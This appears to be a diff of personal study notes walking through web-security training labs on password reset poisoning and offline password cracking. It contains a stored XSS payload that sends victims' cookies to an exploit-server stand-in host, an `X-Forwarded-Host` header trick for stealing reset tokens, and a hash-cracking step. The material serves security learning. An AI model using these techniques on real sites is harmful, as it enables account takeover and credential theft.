@@ -252,4 +252,47 @@ This lab stores the user's password hash in a cookie. The lab also contains an X
 8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
 9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
 
+# **10. Password reset poisoning via middleware**
+This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.
+
+1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
+2. Send the `POST /forgot-password` request to Burp Repeater. Notice that the `X-Forwarded-Host` header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
+3. Go to the exploit server and make a note of your exploit server URL.
+4. Go back to the request in Burp Repeater and add the `X-Forwarded-Host` header with your exploit server URL:
+    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
+5. Change the `username` parameter to `carlos` and send the request.
+6. Go to the exploit server and open the access log. You should see a `GET /forgot-password` request, which contains the victim's token as a query parameter. Make a note of this token.
+7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the `temp-forgot-password-token` parameter to the value that you stole from the victim.
+8. Load this URL and set a new password for Carlos's account.
+
 Analysis:
+- capture the forgot password request in burp
+![[Pasted image 20241021141937.png]]
+
+- adding `X-Forwarded-Host: external exploit server` to capture the new forgot password request with a new username: `carlos`
+![[Pasted image 20241021142119.png]]
+	![[Pasted image 20241021142233.png]]
+
+- we will use our valid change password URL and swap token with the new one that we have generated for user `carlos`
+![[Pasted image 20241021142519.png]]
+
+# **11. Offline password cracking**
+This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
+
+- Your credentials: `wiener:peter`
+- Victim's username: `carlos`
+
+1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
+2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
+    `username+':'+md5HashOfPassword`
+3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
+4. Go to the exploit server and make a note of the URL.
+5. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID:
+    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
+6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
+7. Decode the cookie in Burp Decoder. The result will be:
+    `carlos:26323c16d5f4dabff3bb136f2460a943`
+8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
+
+Analysis:
+
